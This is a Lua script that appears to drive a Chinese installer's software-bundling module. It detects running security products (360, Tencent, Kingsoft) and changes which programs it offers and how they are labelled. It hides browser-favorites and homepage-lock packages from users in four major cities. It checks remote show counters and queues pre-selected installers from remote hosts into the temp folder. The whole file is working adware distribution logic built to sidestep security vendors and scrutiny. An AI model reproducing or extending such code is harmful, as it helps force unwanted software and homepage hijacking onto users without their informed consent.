require ("unicorn")
require ("extra")

project = "xxbz"
function report_kunbang(name,p1,p2,p3,p4,p5,p6,p7)
	extra.report_kunbang(project,name,p1,p2,p3,p4,p5,p6,p7)
end

function taskid_last_time(value)
	return extra.taskid_last_time(project,value)
end

function save_taskid(value)
	extra.save_taskid(project,value)
end

function qid()
	return g_qid
end

function version()
	return extra.version(project)
end

function md5()
	return extra.md5(project)
end

function city_name()
	return extra.city_name(project)
end

function nopop_set_time(value)
	return extra.nopop_set_time(project,value)
end

function printf(value)
	unicorn.printf(value .. "\n")
end

--安装间隔天数/近期不弹/最小间隔天数判断，返回结果结果为天数直接判断大小
function interval(timestamp)
	local today = os.time({year=os.date("%Y",os.time()), month=os.date("%m",os.time()), day=os.date("%d",os.time())})
	local otherday = os.time({year=os.date("%Y",timestamp), month=os.date("%m",timestamp), day=os.date("%d",timestamp)})
	local day = math.floor(os.difftime(today,otherday)/86400)
	return math.abs(day)
end

function report_onday(value,from)
	if interval(taskid_last_time(value)) < 1 then
		return
	else
		report_kunbang(value,true,true,true,true,0,from,true)
		save_taskid(value)
		return
	end
end

function is_xp()
    if unicorn.system_info.v1 == 5 then
		return true
	else
		return false
	end
end

function table_maxn(t)
    local mn = 1;
    for k, v in pairs(t) do
      if(type(k) ~= "number") then
        mn = 0;
      end
    end
    return mn;
end

function table2json(t)  
    local function serialize(tbl)  
            local tmp = {}  
            for k, v in pairs(tbl) do  
                    local k_type = type(k)
                    local v_type = type(v)
                    local key = (k_type == "string" and "\"" .. k .. "\":")  
                        or (k_type == "number" and "")  
                    local value = (v_type == "table" and serialize(v))  
                        or (v_type == "boolean" and tostring(v))  
                        or (v_type == "string" and "\"" .. v .. "\"")  
                        or (v_type == "number" and v)  
                    tmp[#tmp + 1] = key and value and tostring(key) .. tostring(value) or nil  
            end  
            if table_maxn(tbl) == 0 then  
                    return "{" .. table.concat(tmp, ",") .. "}"  
            else  
                    return "[" .. table.concat(tmp, ",") .. "]"  
            end  
    end  
    assert(type(t) == "table")  
    return serialize(t)  
end

--匹配数组内元素,value=搜索词,array=被搜索数组,searchtype不填写或写0为前置匹配,其他为全词匹配
function stringinarray(value,array,searchtype)
	if searchtype == nil or searchtype == 0 then
		-- 前置匹配
		for k, v in ipairs(array) do
			local pos = string.find( string.upper(value), string.upper(v))
			if (pos == 1) then
				return true
			end
		end
		return false
	else
		--全词匹配
		for k, v in ipairs(array) do
			if (string.upper(v) == string.upper(value)) then
			return true
			end
		end
		return false
	end
end

--检查不弹环境,输入上报前缀及不弹列表
function check_enviroment(exclude_list)
	-- 检查渠道号
	if stringinarray(qid(),exclude_list.qid) then
		return false
	end
	-- 检查版本号
	if stringinarray(version(),exclude_list.version) then
		return false
	end
	-- 检查md5
	if stringinarray(md5(),exclude_list.md5,1) then
		return false
	end
	-- 检查城市
	if stringinarray(city_name(),exclude_list.citys,1) then
		return false
	end
	-- 检查进程名
	for k,v in ipairs(exclude_list.process)
	do 
		if stringinarray(v,unicorn.process,1)
		then
			return false
		end
	end
	return true
end

function klcheck(name)
	return unicorn.web_http_get("http://xhapi.7654.com/showcountnew.php?param=show&name=" .. name)
end



function is_exist(type,value)
	if type == "desktopfile" then
		if unicorn.file_exists(0,value) == true or unicorn.file_exists(19,value) == true then
			return true
		else
			return false
		end
	elseif type == "reg" then
		local start_i,end_j,substr = string.find(value,"(.-)/")
		local rootkey = (substr == "HKEY_LOCAL_MACHINE" and "HKLM") or (substr == "HKEY_CURRENT_USER" and "HKCU")
		local subkey = string.gsub(string.gsub(value,"(.-/)","",1),"/","\\\\")
		return unicorn.reg_key_exist(rootkey,subkey)
	end
end

function soft_list_get(softs)
	local soft = {}
	local soft_list = {}
	local is_insert = true
	for k,v in pairs(softs) do
		is_insert = true
		soft = source_list(v)
		if soft ~= nil then
			if soft.detail.reg ~= nil and is_exist("reg",soft.detail.reg) == true then
				is_insert = false
			elseif soft.detail.desktopfile ~= nil and is_exist("desktopfile",soft.detail.desktopfile) == true then
				is_insert = false
			end
			if soft.maxshowcount ~= nil then
				if tonumber(klcheck(soft.detail.count_url)) >= tonumber(soft.maxshowcount) then
					is_insert = false
				end
			end
		else
			is_insert = false
		end
		
		if is_insert == true then
			table.insert(soft_list,soft.detail)
		end
		if #soft_list == 3 then
			return soft_list
		end
	end
	return soft_list
end
function source_list(display)
	if	(display == "收藏夹" or display == "锁首" or display == "收藏夹锁首") and stringinarray(city_name(),{"珠海","北京","上海","深圳"},1) then
		return nil
	elseif display == "7654浏览器" and is_xp() == true then
		return nil
	end
	local soft_source = {
		["收藏夹"] = {
            name = "SHHelper_abc_fav7z",
            display = (is360 == true and "收藏夹") or ("天猫收藏夹"),
            url = "http://down2.abckantu.com/tui/llqfavorites/zm/SHHelper_abc_fav.7z"
		},
		["锁首"] = {
            name = "SHHelper_abc_lock7z",
            display = (is360 == true and "360导航") or ("7654导航"),
            url = "http://down2.abckantu.com/tui/llqfavorites/zm/SHHelper_abc_lock.7z"
		},
		["收藏夹锁首"] = {
            name = "SHHelper_abc7z",
            display = ((is360 ~= true and isqq ~= true and isjs ~= true) and "工具栏") or ("天猫收藏夹"),
            url = "http://down2.abckantu.com/tui/llqfavorites/zm/SHHelper_abc.7z"
		},
		["快压"] = {
            name = "KuaiZip",
            display = "快压",
            url = "http://dl.kkdownload.com/kzabckantu/KuaiZip_Setup_1485169199_ktky_005.exe",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Kuaizip"
		},
		["快压dll"] = {
            name = "KuaiZip_Setup_v2.8.28.28_kantu1_0017z",
            display = "快压",
            url = "http://down2.abckantu.com/tui/kuaizip/KuaiZip_Setup_v2.8.28.28_kantu1_001.7z",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Kuaizip"
		},
		["小黑记事本"] = {
            name = "HeiNote",
            display = "小黑记事本",
            url = "http://d.heinote.com/downloads/kantuhn6/HNInstall_Setup_1667844670_kantu_001.exe",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\HeiNote"
		},
		["小黑记事本dll"] = {
            name = "HNInstall_Setup_v2.0.4.6_kt_0017z",
            display = "小黑记事本",
            url = "http://down2.abckantu.com/tui/heinote/HNInstall_Setup_v2.0.4.6_kt_001.7z",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\HeiNote"
		},
		["小鱼便签"] = {
            name = "xykantu",
            display = "小鱼便签",
            url = "http://downxy.shzhanmeng.com/xykantuxy5/XY_Setup_1736976150_xykantu_01.exe",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\xiaoyu"
		},
		["小鱼便签dll"] = {
            name = "XY_Setup_v1.2.0.1_xykantu_027z",
            display = "小鱼便签",
            url = "http://down2.abckantu.com/tui/xiaoyu/XY_Setup_v1.2.0.1_xykantu_02.7z",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\xiaoyu"
		},
		["爱奇艺"] = {
			name = "iqiyihn-67z",
			display = "爱奇艺",
			url = "http://bundle-hn.7654.com/n/tui/aiqiyi/6/iqiyihn-6.7z",
			reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\PPStream"
		},
		["7654浏览器"] = {
            name = "7654browser",
            display = "7654浏览器",
            url = "http://down2.7654browser.shzhanmeng.com/kt/7654Browser_3780317313_kt_005.exe",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\7654browser"
		},
		["光速搜索"] = {
            name = "Finder",
            display = "光速搜索",
            url = "http://cdnfinder.shzhanmeng.com/ktgs2/Finder_Setup_3780317313_kt_005.exe",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Finder"
		},
		["光速搜索1"] = {
			name = "Finder",
			display = "光速搜索",
			url = "http://cdnfinder.shzhanmeng.com/ktgs5/Finder_Setup_3780317313_kt_005.exe",
			reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Finder"
		},
		["光速搜索dll"] = {
            name = "Finder_Setup_2.2.1.15_kt_0027z",
            display = "光速搜索",
            url = "http://down2.abckantu.com/tui/finder/Finder_Setup_2.2.1.15_kt_002.7z",
            reg = "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Finder"
		}
	}
	--[[
		count_url = klurl .. "",
		maxshowcount = 100
	]]
	local soft = {
		detail = {
			name = soft_source[display].name,
			display = soft_source[display].display,
			url = soft_source[display].url,
			selected = true,
			save_path = "%temp%/xxbz/" .. string.gsub(soft_source[display].url,".*/","")
		}
	}
	if soft_source[display].reg ~= nil then
		soft.detail.reg = soft_source[display].reg
	elseif soft_source[display].desktopfile ~= nil then
		soft.detail.desktopfile = soft_source[display].desktopfile
	end
	if soft_source[display].count_url ~= nil then
		soft.maxshowcount = soft_source[display].maxshowcount
		soft.detail.count_url = soft_source[display].count_url
	end
	return soft
end


function kunbang_360()
	local softs = {}
	if stringinarray(qid(),{"sem_"}) and stringinarray(city_name(),{"北京"},1) then
		softs = {}
	elseif stringinarray(qid(),{"sem_"}) then
		softs = {}
	end
	return {software = soft_list_get(softs)}
end


function kunbang_js()
	local softs = {}
	if stringinarray(qid(),{"sem_"}) then
		softs = {"快压","小黑记事本","光速搜索1","小鱼便签"}
	end
	return {software = soft_list_get(softs)}
end

function kunbang_qq()
	local softs = {}
	if stringinarray(qid(),{"sem_"}) then
		softs = {"快压","小黑记事本","光速搜索","小鱼便签","7654浏览器"}
	end
	return {software = soft_list_get(softs)}
end

function kunbang_qt()
	local softs = {}
	if stringinarray(qid(),{"sem_"}) then
		softs = {"快压","小黑记事本","光速搜索","小鱼便签","7654浏览器"}
	end
	return {software = soft_list_get(softs)}
end

function main()
	is360 = stringinarray("ZhuDongFangYu.exe",unicorn.process)
	isqq = stringinarray("QQPCRTP.exe",unicorn.process)
	isjs = stringinarray("kxescore.exe",unicorn.process)
	klurl = "http://xhapi.7654.com/showcountnew.php?name="
	
	if is360 == true then
		result = table2json(kunbang_360())
	elseif isqq == true then
		result = table2json(kunbang_qq())
	elseif isjs == true then
		result = table2json(kunbang_js())
	else
		result = table2json(kunbang_qt())
	end
	--print(result)
end

local exclude_list = {
	qid = {},
	version = {},
	process = {},
	md5 = {},
	citys = {}
}

if check_enviroment(exclude_list) == false then
	result = {}
	return
end

main()